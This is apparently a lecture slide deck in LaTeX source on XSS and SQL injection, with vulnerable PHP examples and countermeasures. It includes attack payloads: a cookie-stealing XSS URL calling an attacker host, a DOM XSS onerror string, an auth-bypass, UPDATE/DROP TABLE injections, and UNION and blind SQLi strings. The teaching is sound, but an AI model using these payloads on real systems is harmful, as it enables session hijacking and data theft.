@@ -1,0 +1,1213 @@
+
+%\documentclass[landscape]{slides}
+\documentclass{beamer}
+\usepackage{beamerfoils}
+\usetheme{Pittsburgh}
+%\usepackage[accumulated]{beamerseminar}
+                                % remove ``accumulated'' option
+                                % for original behaviour
+%\usepackage{beamerthemeclassic}
+\usepackage{ulem}
+%\usepackage{beamerthemesplit}
+
+%\usepackage{beamerthemeshadow}
+
+%\usepackage{beamerthemeplain}
+%\usepackage{times}
+\usepackage{colortbl}
+
+%\usepackage{lslide}
+\def\emptyline{\vspace{10pt}}
+\usepackage{amssymb}
+%\usepackage{french}
+%\usepackage[latin1]{inputenc}
+\usepackage[utf8]{inputenc}
+%\usepackage[T1]{fontenc}
+\usepackage[]{color}
+%\usepackage[usenames,dvipsnames]{color}
+%\usepackage[pdftex]{color}
+%\usepackage[]{colorlslide,epsfig}
+%\usepackage{amsfonts,stmaryrd}
+\usepackage{epsfig}
+
+\usepackage{graphicx,array}
+\usepackage{tikz}
+\usetikzlibrary{shadows.blur}
+\usetikzlibrary{positioning,arrows.meta,calc}
+\usepackage{amsmath}%,amsthm}
+\usepackage{hyperref}
+\usepackage{pifont}
+\usepackage{listings}
+
+%\renewcommand{\frame}{\end{slide}   \begin{slide}}
+%\newcommand{\frametitle}{\centerline}
+
+
+%\usepackage{beamerthemeshadow}
+\usepackage{graphicx}
+%\usepackage{beamerthemesplit}
+
+\graphicspath{{./}{figures/}}
+
+%%%%%%%%%%%%%%%%%% ENVIRONMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\newtheorem{deft}{Definition}
+%\newtheorem{theorem}{Theorem}
+\newtheorem{proposition}{Proposition}
+\newtheorem{exemple}{Example}
+\newtheorem{postulat}{Postulate}
+
+
+%%%%%%%%%%%%%%%%%% COLORS %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\definecolor{encre}{rgb}{0.2, 0, 0.4}
+\definecolor{lightblue}{rgb}{0.3,0.35,5}
+
+\newcommand{\red}[1]{\only<#1>{\color{red}}}
+\newcommand{\green}[1]{\only<#1>{\color{green}}}
+\newcommand{\lra}{\leftrightarrow}
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\enlight}[1]{\textit{\color{blue}#1}}
+\newcommand{\blue}[1]{\textit{\color{blue}#1}}
+\newcommand{\circled}[1]{\raisebox{.5pt}{\textcircled{\raisebox{-.9pt}{\scriptsize #1}}}}
+
+%%   for the headline etc.
+\renewcommand\normalcolor{\color{coltitle}}
+
+
+%%   for the background
+%\pagecolor{grisbleu}
+%%   for the text
+\color{encre}
+
+%%%%%%%%%%%%%%% LISTINGS CONFIGURATION %%%%%%%%%%%%%%%%%%%%%%%%%%
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    basicstyle=\ttfamily\scriptsize,
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    breaklines=true,
+    showstringspaces=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    numbers=left,
+    numberstyle=\tiny\color{codegray},
+    numbersep=5pt,
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+}
+
+%%%%%%%%%%%%%%% style ....
+ \beamertemplatenavigationsymbolsempty
+\beamertemplatefootempty
+%\beamertemplatefootframenumber
+\setbeamertemplate{footline}[frame number]
+
+
+\title{Code Injection}
+
+\AtBeginSection[]
+{
+\begin{frame}
+\frametitle{Outline}
+\tableofcontents[currentsection,sectionstyle=show/shaded,subsectionstyle=show/show/hide]
+\end{frame}
+}
+
+\AtBeginSubsection[]
+{
+\begin{frame}
+\frametitle{Outline}
+\tableofcontents[currentsubsection,sectionstyle=show/shaded,subsectionstyle=show/shaded/hide]
+\end{frame}
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\titlegraphic{
+\centering
+\includegraphics[width=4cm]{logo-upvd.png}
+}
+\begin{document}
+
+\maketitle
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 1: Web Application Vulnerabilities
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Web Application Vulnerabilities}
+
+\begin{frame}
+\frametitle{Web Application Vulnerabilities}
+
+\begin{itemize}
+\item When web applications contain programming errors, attackers can exploit them remotely to:
+\begin{itemize}
+\item modify website content,
+\item access databases,
+\item execute commands on the server.
+\end{itemize}
+\item There are many types of web programming errors that allow attackers to take control.
+\item The \textit{Open Web Application Security Project} (OWASP) catalogues these errors and helps developers avoid them.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{OWASP Top 10}
+
+The OWASP \textit{Top 10} is the reference for web application security risks. In 2021:
+\begin{enumerate}
+\item \alert{Broken Access Control}
+\item Cryptographic Failures
+\item \alert{Injection} (SQL, commands, LDAP, XSS...)
+\item Insecure Design
+\item Security Misconfiguration
+\item Vulnerable and Outdated Components
+\item Identification and Authentication Failures
+\item Software and Data Integrity Failures
+\item Security Logging and Monitoring Failures
+\item \alert{Server-Side Request Forgery (SSRF)}
+\end{enumerate}
+\emptyline
+\blue{Common principle}: unvalidated user input is the primary attack vector.
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 2: Cross-Site Scripting (XSS)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Cross-Site Scripting (XSS)}
+
+
+\subsection{XSS Principle}
+
+\begin{frame}
+\frametitle{Cross-Site Scripting -- Definition}
+
+\begin{itemize}
+\item \textbf{Cross-Site Scripting} (XSS) consists of injecting malicious code (HTML or JavaScript) into a web page.
+\item The website must allow visitors to provide content, and this content is \alert{not properly filtered}.
+\item The injected code executes in the browsers of future visitors, with the \alert{same privileges} as the legitimate site.
+\end{itemize}
+
+\emptyline
+\begin{block}{OWASP Ranking}
+XSS is part of the \textbf{Injection} category (\#3) in the OWASP Top 10 2021. It is one of the most widespread vulnerabilities on the web.
+\end{block}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{The 3 Types of XSS}
+
+\begin{scriptsize}
+\begin{tabular}{|p{3.2cm}|c|c|c|}
+\hline
+& \textbf{Reflected} & \textbf{Stored} & \textbf{DOM} \\
+\hline
+Script passes through server & Yes & Yes & \alert{No} \\
+\hline
+Persistent in DB & No & \alert{Yes} & No \\
+\hline
+Attack vector & Crafted URL & Form input & URL / Fragment \\
+\hline
+Potential victims & 1 click = 1 victim & All visitors & 1 click = 1 victim \\
+\hline
+Detection difficulty & Medium & Easy & Hard \\
+\hline
+\end{tabular}
+\end{scriptsize}
+
+\emptyline
+\begin{itemize}
+\item \textbf{Reflected}: the script is immediately returned by the server in the response.
+\item \textbf{Stored}: the script is saved in the database and displayed on every visit.
+\item \textbf{DOM}: the script is injected and executed entirely client-side.
+\end{itemize}
+\end{frame}
+
+
+\subsection{Reflected XSS}
+
+\begin{frame}
+\frametitle{Reflected XSS -- Attack Flow}
+
+\begin{center}
+\begin{tikzpicture}[
+    node distance=1.8cm and 2.5cm,
+    >={Stealth[length=3mm]},
+    box/.style={rectangle, rounded corners=4pt, draw, minimum width=2cm, minimum height=1cm, align=center, font=\small},
+    malicious/.style={box, draw=red, thick, fill=red!8},
+    legitimate/.style={box, draw=blue, thick, fill=blue!8},
+    arrow label/.style={font=\scriptsize, fill=white, inner sep=1pt}
+]
+\node[malicious] (attacker) {Attacker};
+\node[legitimate, right=3cm of attacker] (victim) {Victim};
+\node[legitimate, below=2.5cm of victim] (server) {Web Server};
+
+\draw[->, red, thick] (attacker) -- node[arrow label, above] {\circled{1} Crafted URL} (victim);
+\draw[->, blue, thick] (victim) -- node[arrow label, right] {\circled{2} Clicks the link} (server);
+\draw[->, red, thick] (server) -- node[arrow label, left, text width=2.5cm, align=center] {\circled{3} Page + malicious\\script} (victim);
+\draw[->, red, thick, dashed] (victim.south west) -- node[arrow label, below, sloped] {\circled{4} Stolen data} (attacker.south east);
+\end{tikzpicture}
+\end{center}
+
+\vspace{-0.5em}
+The malicious script is \alert{reflected by the server} in the response page, then executed in the victim's browser.
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Reflected XSS -- Vulnerable Code}
+
+\begin{lstlisting}[language=PHP,title={\texttt{search.php -- Vulnerable search page}}]
+<?php
+  $query = $_GET['q'];  // No filtering!
+?>
+<html>
+<body>
+  <h2>Results for: <?php echo $query; ?></h2>
+  <!-- ... search results ... -->
+</body>
+</html>
+\end{lstlisting}
+
+\emptyline
+If \texttt{q = <script>alert('XSS')</script>}, the resulting HTML will be:
+\begin{lstlisting}[language=HTML,title={\texttt{HTML produced by the server}}]
+<h2>Results for: <script>alert('XSS')</script></h2>
+\end{lstlisting}
+The browser \alert{executes the script} as if it were part of the site.
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Reflected XSS -- Step-by-Step Exploitation}
+
+\textbf{1.} The attacker crafts a malicious URL:
+\begin{lstlisting}[basicstyle=\ttfamily\tiny,breaklines=true,frame=single]
+http://site.com/search.php?q=<script>
+  new Image().src='http://pirat.es/steal?c='+document.cookie;
+</script>
+\end{lstlisting}
+
+\textbf{2.} They send this link to the victim (email, message, social media).
+
+\textbf{3.} The victim clicks $\rightarrow$ the server returns the page with the script.
+
+\textbf{4.} The browser executes the script:
+\begin{itemize}
+\item The \alert{session cookie} is sent to the attacker's server.
+\item The attacker can impersonate the victim.
+\end{itemize}
+
+\emptyline
+\begin{alertblock}{Key takeaway}
+The victim only sees a normal search page -- the attack is \textbf{invisible}.
+\end{alertblock}
+\end{frame}
+
+
+\subsection{Stored XSS}
+
+\begin{frame}
+\frametitle{Stored XSS -- Attack Flow}
+
+\begin{center}
+\begin{tikzpicture}[
+    node distance=1.5cm and 2cm,
+    >={Stealth[length=3mm]},
+    box/.style={rectangle, rounded corners=4pt, draw, minimum width=1.8cm, minimum height=0.9cm, align=center, font=\small},
+    malicious/.style={box, draw=red, thick, fill=red!8},
+    legitimate/.style={box, draw=blue, thick, fill=blue!8},
+    data/.style={box, draw=orange, thick, fill=orange!8},
+    arrow label/.style={font=\scriptsize, fill=white, inner sep=1pt}
+]
+\node[malicious] (attacker) {Attacker};
+\node[legitimate, right=4cm of attacker] (server) {Web Server};
+\node[data, below=1.5cm of server] (db) {Database};
+\node[legitimate, below=1.5cm of attacker] (victim) {Victim};
+
+\draw[->, red, thick] (attacker) -- node[arrow label, above] {\circled{1} Malicious comment} (server);
+\draw[->, red, thick] (server) -- node[arrow label, right] {\circled{2} Storage} (db);
+\draw[->, blue, thick] (victim) -- node[arrow label, below] {\circled{3} Visits the page} (server);
+\draw[->, orange, thick] (db) -- node[arrow label, right] {} (server);
+\draw[->, red, thick] (server.south west) -- node[arrow label, above, sloped, text width=2cm, align=center] {\circled{4} Page + script} (victim.north east);
+\end{tikzpicture}
+\end{center}
+
+The script is \alert{persistent}: it will be executed for \textbf{every visitor} of the page, without requiring a crafted link.
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Stored XSS -- Vulnerable Code}
+
+\begin{lstlisting}[language=PHP,title={\texttt{Inserting a comment (vulnerable)}}]
+<?php
+// Storing the comment without filtering
+$comment = $_POST['comment'];
+$db->query("INSERT INTO comments (text)
+            VALUES ('$comment')");
+?>
+\end{lstlisting}
+
+\begin{lstlisting}[language=PHP,title={\texttt{Displaying comments (vulnerable)}}]
+<?php
+$results = $db->query("SELECT text FROM comments");
+while ($row = $results->fetch()) {
+    echo "<p>" . $row['text'] . "</p>"; // No escaping
+}
+?>
+\end{lstlisting}
+
+If a comment contains \texttt{<script>...</script>}, the script will be executed in the browser of \alert{every visitor}.
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Stored XSS -- Concrete Impacts}
+
+\begin{columns}[T]
+\begin{column}{0.55\textwidth}
+{\small\textbf{Session hijacking (cookie theft)}:}
+\begin{small}
+\begin{enumerate}\itemsep0pt
+\item The script reads \texttt{document.cookie}
+\item It sends the cookie to the attacker's server
+\item The attacker hijacks the session
+\end{enumerate}
+\end{small}
+
+\vspace{2pt}
+{\small\textbf{Other impacts}:}
+\begin{small}
+\begin{itemize}\itemsep0pt
+\item \alert{Redirection} to phishing site
+\item \alert{Defacement} of the site
+\item \alert{Keylogger}: keystroke capture
+\item \alert{Cryptominer} in the browser
+\end{itemize}
+\end{small}
+\end{column}
+
+\begin{column}{0.42\textwidth}
+\begin{tikzpicture}[
+    >={Stealth[length=2.5mm]},
+    box/.style={rectangle, rounded corners=3pt, draw, minimum width=1.5cm, minimum height=0.6cm, align=center, font=\scriptsize},
+    malicious/.style={box, draw=red, fill=red!8},
+    legitimate/.style={box, draw=blue, fill=blue!8},
+    data/.style={box, draw=orange, fill=orange!8},
+]
+\node[legitimate] (browser) {Victim's\\browser};
+\node[data, below=0.6cm of browser] (cookie) {Session\\cookie};
+\node[malicious, below=0.6cm of cookie] (pirate) {Attacker's\\server};
+
+\draw[->, orange, thick] (browser) -- node[right, font=\tiny] {document.cookie} (cookie);
+\draw[->, red, thick] (cookie) -- node[right, font=\tiny] {HTTP GET} (pirate);
+\end{tikzpicture}
+\end{column}
+\end{columns}
+\end{frame}
+
+
+\subsection{DOM-based XSS}
+
+\begin{frame}
+\frametitle{DOM-based XSS -- Flow}
+
+\begin{center}
+\begin{tikzpicture}[
+    node distance=1.5cm,
+    >={Stealth[length=3mm]},
+    box/.style={rectangle, rounded corners=4pt, draw, minimum width=2.2cm, minimum height=0.9cm, align=center, font=\small},
+    malicious/.style={box, draw=red, thick, fill=red!8},
+    legitimate/.style={box, draw=blue, thick, fill=blue!8},
+    arrow label/.style={font=\scriptsize, fill=white, inner sep=1pt}
+]
+\node[malicious] (url) {Malicious URL};
+\node[legitimate, right=3cm of url] (browser) {Browser};
+\node[legitimate, below=1.2cm of browser] (js) {Client-side\\JavaScript};
+\node[legitimate, below=1.2cm of js] (dom) {Page DOM};
+
+\draw[->, red, thick] (url) -- node[arrow label, above] {\circled{1} Fragment / parameter} (browser);
+\draw[->, blue, thick] (browser) -- node[arrow label, right] {\circled{2} Read by JS} (js);
+\draw[->, red, thick] (js) -- node[arrow label, right] {\circled{3} innerHTML / eval} (dom);
+\end{tikzpicture}
+\end{center}
+
+\begin{alertblock}{Key characteristic}
+The malicious script \alert{never passes through the server}. Everything happens client-side. Server-side tools (WAF, logs) cannot detect the attack.
+\end{alertblock}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{DOM-based XSS -- Vulnerable Code}
+
+\begin{lstlisting}[language=HTML,title={\texttt{Vulnerable page using innerHTML}}]
+<div id="welcome"></div>
+<script>
+  // Read the URL fragment (after the #)
+  var name = document.location.hash.substring(1);
+  // Directly inserted into the DOM -- VULNERABLE
+  document.getElementById("welcome").innerHTML =
+    "Welcome " + name;
+</script>
+\end{lstlisting}
+
+\textbf{Exploitation} with the URL:
+\begin{center}
+\texttt{page.html\#<img src=x onerror=alert(document.cookie)>}
+\end{center}
+
+\emptyline
+\textbf{Secure version}: use \texttt{textContent} instead of \texttt{innerHTML}:
+\begin{lstlisting}[language=HTML,title={\texttt{Fix}}]
+document.getElementById("welcome").textContent =
+    "Welcome " + name;  // Treated as text, not HTML
+\end{lstlisting}
+\end{frame}
+
+
+\subsection{XSS Countermeasures}
+
+\begin{frame}[fragile]
+\frametitle{XSS Countermeasures -- Defense in Depth}
+
+\textbf{1. HTML escaping} (\texttt{htmlspecialchars} in PHP):
+\begin{lstlisting}[language=PHP]
+// VULNERABLE:
+echo "Welcome " . $_GET['name'];
+// SECURE:
+echo "Welcome " . htmlspecialchars($_GET['name'],
+                       ENT_QUOTES, 'UTF-8');
+\end{lstlisting}
+
+\textbf{2. Content Security Policy (CSP)} -- HTTP header:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+Content-Security-Policy: script-src 'self'; object-src 'none'
+\end{lstlisting}
+$\rightarrow$ Blocks inline scripts and unauthorized external sources.
+
+\emptyline
+\textbf{3. HttpOnly and Secure cookies}:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+\end{lstlisting}
+$\rightarrow$ \texttt{HttpOnly} prevents access via \texttt{document.cookie}.
+\end{frame}
+
+
+\begin{frame}
+\frametitle{XSS Countermeasures -- Summary}
+
+\begin{scriptsize}
+\begin{tabular}{|p{3.5cm}|p{5.5cm}|}
+\hline
+\textbf{Defense} & \textbf{Protects against} \\
+\hline
+\texttt{htmlspecialchars()} & Reflected and stored XSS (HTML output) \\
+\hline
+\texttt{textContent} (not \texttt{innerHTML}) & DOM-based XSS \\
+\hline
+Content Security Policy & All types (blocks inline scripts) \\
+\hline
+\texttt{HttpOnly} cookies & Cookie theft (all types) \\
+\hline
+Server-side validation & Reflected and stored XSS \\
+\hline
+Frameworks (React, Angular...) & Automatic escaping by default \\
+\hline
+\end{tabular}
+\end{scriptsize}
+
+\emptyline
+\begin{block}{Golden rule}
+\alert{Never trust user data.} Always escape on output, according to context (HTML, JS, URL, CSS).
+\end{block}
+\end{frame}
+
+
+\subsection{XSS Detection Tools}
+
+\begin{frame}
+\frametitle{XSS Detection Tools}
+
+\begin{description}
+\item[\textbf{Burp Suite}] HTTP interception proxy. Allows modifying requests in real time and injecting XSS payloads into parameters. Free Community edition available.
+
+\item[\textbf{OWASP ZAP}] Open source alternative to Burp Suite. Automatic scanner that detects reflected and stored XSS. Ideal for beginners.
+
+\item[\textbf{DevTools (browser)}] The \texttt{Console} tab allows testing JavaScript payloads. The \texttt{Network} tab shows sent requests. The \texttt{Elements} tab allows inspecting the DOM.
+\end{description}
+
+\emptyline
+\begin{alertblock}{Ethical use}
+These tools must only be used on applications for which you have \textbf{explicit authorization} to test.
+\end{alertblock}
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 3: SQL Injection
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{SQL Injection}
+
+
+\subsection{SQL Injection Principle}
+
+\begin{frame}
+\frametitle{Web Application Architecture with Database}
+
+\begin{center}
+\begin{tikzpicture}[
+    node distance=2cm,
+    >={Stealth[length=3mm]},
+    box/.style={rectangle, rounded corners=4pt, draw=blue, thick, fill=blue!8, minimum width=2cm, minimum height=1cm, align=center, font=\scriptsize},
+    arrow label/.style={font=\tiny, fill=white, inner sep=1pt}
+]
+\node[box] (client) {Client\\(browser)};
+\node[box, right=2cm of client] (server) {Web Server\\(PHP, Python...)};
+\node[box, right=2cm of server] (db) {Database};
+
+\draw[->, thick] (client) -- node[arrow label, above] {HTTP Request} node[arrow label, below] {form, URL} (server);
+\draw[->, thick] (server) -- node[arrow label, above] {SQL Query} (db);
+\draw[<-, thick, blue] (server.south east) -- ++(1,0) |- node[arrow label, below, pos=0.25] {Results} (db.south);
+\draw[<-, thick, blue] (client.south east) -- ++(1,0) |- node[arrow label, below, pos=0.25] {HTML Page} (server.south);
+\end{tikzpicture}
+\end{center}
+
+\begin{itemize}
+\item The application uses \texttt{SQL} to communicate with the database.
+\item SQL queries often contain data provided by the user (name, password, search terms...).
+\item If this data is not \alert{properly handled}, the user can manipulate the SQL query.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{How SQL Injection Occurs}
+
+The fundamental problem: \alert{string concatenation} mixes SQL code and user data.
+
+\begin{lstlisting}[language=PHP,title={\texttt{Dangerous query construction}}]
+// User input is directly concatenated
+$name = $_POST['name'];
+$sql = "SELECT * FROM users WHERE name = '" . $name . "'";
+\end{lstlisting}
+
+\begin{itemize}
+\item If \texttt{name = Alice}, the query is: \texttt{SELECT * FROM users WHERE name = 'Alice'} $\checkmark$
+\item If \texttt{name = ' OR 1=1 -{}-}, the query becomes: \texttt{SELECT * FROM users WHERE name = '' OR 1=1 -{}-'} $\leftarrow$ \alert{injection!}
+\end{itemize}
+
+\emptyline
+\begin{alertblock}{Principle}
+The attacker \alert{closes the string} with a quote, then adds arbitrary SQL code. The \texttt{-{}-} comments out the rest.
+\end{alertblock}
+\end{frame}
+
+
+\subsection{Exploitation Examples}
+
+\begin{frame}[fragile]
+\frametitle{SQL Injection -- Vulnerable Authentication Code}
+
+\begin{lstlisting}[language=PHP,title={\texttt{login.php -- Vulnerable authentication}}]
+<?php
+$user = $_POST['username'];
+$pass = $_POST['password'];
+
+$sql = "SELECT Username FROM t_user
+        WHERE Username='" . $user . "'
+        AND Password='" . $pass . "'";
+
+$result = mysqli_query($conn, $sql);
+
+if (mysqli_num_rows($result) == 0) {
+    // Bad credentials
+    header("Location: login.php?error=1");
+} else {
+    // Login successful
+    session_start();
+    $_SESSION['user'] = $user;
+}
+?>
+\end{lstlisting}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{SQL Injection -- Authentication Bypass}
+
+Normal query for \texttt{Guillermo} / \texttt{DePasse}:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+SELECT Username FROM t_user
+WHERE Username='Guillermo' AND Password='DePasse'
+\end{lstlisting}
+
+\emptyline
+The attacker enters \texttt{' OR 1=1 -{}-} as username:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+SELECT Username FROM t_user
+WHERE Username='' OR 1=1 --' AND Password=''
+\end{lstlisting}
+
+\begin{itemize}
+\item The \texttt{'} closes the username string $\rightarrow$ SQL resumes.
+\item \texttt{OR 1=1} is \alert{always true} $\rightarrow$ all rows are returned.
+\item \texttt{-{}-} comments out \texttt{AND Password=''}.
+\item Result: the attacker is logged in as the \alert{first user} in the table (often the administrator).
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{SQL Injection -- Attack Flow}
+
+\begin{center}
+\begin{tikzpicture}[
+    node distance=1.5cm and 2.5cm,
+    >={Stealth[length=3mm]},
+    box/.style={rectangle, rounded corners=4pt, draw, minimum width=2cm, minimum height=0.9cm, align=center, font=\small},
+    malicious/.style={box, draw=red, thick, fill=red!8},
+    legitimate/.style={box, draw=blue, thick, fill=blue!8},
+    data/.style={box, draw=orange, thick, fill=orange!8},
+    arrow label/.style={font=\scriptsize, fill=white, inner sep=1pt}
+]
+\node[malicious] (attacker) {Attacker};
+\node[legitimate, right=3.5cm of attacker] (form) {Login\\form};
+\node[legitimate, below=1.5cm of form] (server) {Server\\(PHP)};
+\node[data, below=1.5cm of server] (db) {Database};
+
+\draw[->, red, thick] (attacker) -- node[arrow label, above] {\circled{1} \texttt{' OR 1=1 -{}-}} (form);
+\draw[->, blue, thick] (form) -- node[arrow label, right] {\circled{2} POST} (server);
+\draw[->, red, thick] (server) -- node[arrow label, right, text width=2.5cm, align=center] {\circled{3} Modified SQL} (db);
+\draw[->, orange, thick] (db.west) -- ++(-2,0) |- node[arrow label, left, pos=0.25] {\circled{4} All users!} (server.west);
+\draw[->, red, thick, dashed] (server.north west) -- node[arrow label, above, sloped] {\circled{5} Access granted} (attacker.south east);
+\end{tikzpicture}
+\end{center}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{SQL Injection -- Consequences}
+
+SQL injection attacks can have \alert{devastating consequences}:
+
+\begin{itemize}
+\item \textbf{Reading confidential data}: passwords, personal information, credit card numbers.
+\item \textbf{Modifying data}:
+\begin{center}
+\texttt{'; UPDATE users SET role='admin' WHERE name='attacker' -{}-}
+\end{center}
+\item \textbf{Deleting data}:
+\begin{center}
+\texttt{'; DROP TABLE users -{}-}
+\end{center}
+\item \textbf{Authentication bypass}: access without a password.
+\item \textbf{Command execution}: on some DBMS (via \texttt{xp\_cmdshell} on SQL Server, \texttt{LOAD\_FILE} on MySQL).
+\end{itemize}
+\end{frame}
+
+
+\subsection{Advanced Techniques}
+
+\begin{frame}[fragile]
+\frametitle{SQL Injection -- UNION-based (Step-by-Step)}
+
+\textbf{Step 1:} Determine the number of columns with \texttt{ORDER BY}:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+http://site.com/product?id=1 ORDER BY 1--    (OK)
+http://site.com/product?id=1 ORDER BY 2--    (OK)
+http://site.com/product?id=1 ORDER BY 3--    (Error!)
+\end{lstlisting}
+$\rightarrow$ The original query has \textbf{2 columns}.
+
+\emptyline
+\textbf{Step 2:} Use \texttt{UNION SELECT} to extract data:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+http://site.com/product?id=-1 UNION SELECT Username, Password
+                                     FROM t_user --
+\end{lstlisting}
+
+\begin{itemize}
+\item \texttt{id=-1}: no product matches $\rightarrow$ only the \texttt{UNION} results are displayed.
+\item The attacker can thus \alert{extract} any table: users, orders, banking data...
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Blind SQL Injection -- Boolean-based}
+
+When the application \alert{does not display} SQL results or errors, the attacker asks true/false questions.
+
+\emptyline
+\textbf{Example:} extracting the first character of the admin password:
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+' AND SUBSTRING((SELECT Password FROM t_user
+  WHERE Username='admin'),1,1)='a' --    (normal page = TRUE)
+
+' AND SUBSTRING((SELECT Password FROM t_user
+  WHERE Username='admin'),1,1)='b' --    (different page = FALSE)
+\end{lstlisting}
+
+\begin{itemize}
+\item The attacker tests each possible character (a-z, 0-9...).
+\item They observe the \alert{difference in behavior} of the page (content, size, HTTP code).
+\item Process repeated for each position $\rightarrow$ \textbf{character-by-character} extraction.
+\item Slow but effective: automatable with \texttt{sqlmap}.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Blind SQL Injection -- Time-based}
+
+When even the page behavior does not vary, the attacker uses \alert{response time}.
+
+\begin{lstlisting}[basicstyle=\ttfamily\scriptsize,frame=single]
+' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(3), 0) --
+\end{lstlisting}
+
+\begin{center}
+\begin{tikzpicture}[
+    >={Stealth[length=2.5mm]},
+    box/.style={rectangle, rounded corners=3pt, draw=blue, thick, fill=blue!8, minimum width=2cm, minimum height=0.7cm, align=center, font=\small},
+]
+\node[box] (req1) {Test query};
+\node[box, right=3.5cm of req1] (resp1) {Response};
+
+\draw[->, thick] (req1) -- node[above, font=\scriptsize] {$\sim$3 seconds $\rightarrow$ \alert{TRUE}} (resp1);
+
+\node[box, below=0.8cm of req1] (req2) {Test query};
+\node[box, right=3.5cm of req2] (resp2) {Response};
+
+\draw[->, thick] (req2) -- node[above, font=\scriptsize] {$\sim$0 seconds $\rightarrow$ FALSE} (resp2);
+\end{tikzpicture}
+\end{center}
+
+\begin{itemize}
+\item \texttt{SLEEP(3)}: MySQL waits 3 seconds before responding.
+\item If the response is slow $\rightarrow$ the condition is \alert{true}.
+\item Other functions: \texttt{BENCHMARK()} (MySQL), \texttt{pg\_sleep()} (PostgreSQL), \texttt{WAITFOR DELAY} (SQL Server).
+\end{itemize}
+\end{frame}
+
+
+\subsection{SQL Countermeasures}
+
+\begin{frame}[fragile]
+\frametitle{Countermeasures -- Prepared Statements}
+
+The \alert{best defense}: separate SQL code from data with \textbf{prepared statements}.
+
+\begin{lstlisting}[language=PHP,title={\texttt{BEFORE -- Vulnerable (concatenation)}}]
+$sql = "SELECT * FROM users WHERE name='"
+       . $_POST['name'] . "'";
+$result = $conn->query($sql);
+\end{lstlisting}
+
+\begin{lstlisting}[language=PHP,title={\texttt{AFTER -- Secure (PDO prepared statement)}}]
+$stmt = $pdo->prepare(
+    "SELECT * FROM users WHERE name = :name"
+);
+$stmt->execute(['name' => $_POST['name']]);
+$result = $stmt->fetchAll();
+\end{lstlisting}
+
+\begin{itemize}
+\item The SQL engine first receives the query \alert{structure}, then the \alert{data} separately.
+\item Impossible to inject SQL: data is always treated as \textbf{values}, never as code.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Prepared Statements -- How They Work}
+
+\begin{center}
+\begin{tikzpicture}[
+    node distance=1.2cm and 1.5cm,
+    >={Stealth[length=3mm]},
+    box/.style={rectangle, rounded corners=4pt, draw, minimum width=2.2cm, minimum height=0.9cm, align=center, font=\scriptsize},
+    code/.style={box, draw=blue, thick, fill=blue!8},
+    data/.style={box, draw=orange, thick, fill=orange!8},
+    engine/.style={box, draw=black!60, thick, fill=gray!10, minimum width=2.5cm},
+    arrow label/.style={font=\tiny, fill=white, inner sep=1pt}
+]
+\node[code] (template) {\texttt{SELECT ... WHERE name = ?}};
+\node[data, below=1.2cm of template] (param) {Parameter: \texttt{Alice}};
+\node[engine, right=2.5cm of template, yshift=-0.6cm] (engine) {SQL Engine};
+
+\draw[->, blue, thick] (template) -- node[arrow label, above, sloped] {\circled{1} Structure (code)} (engine);
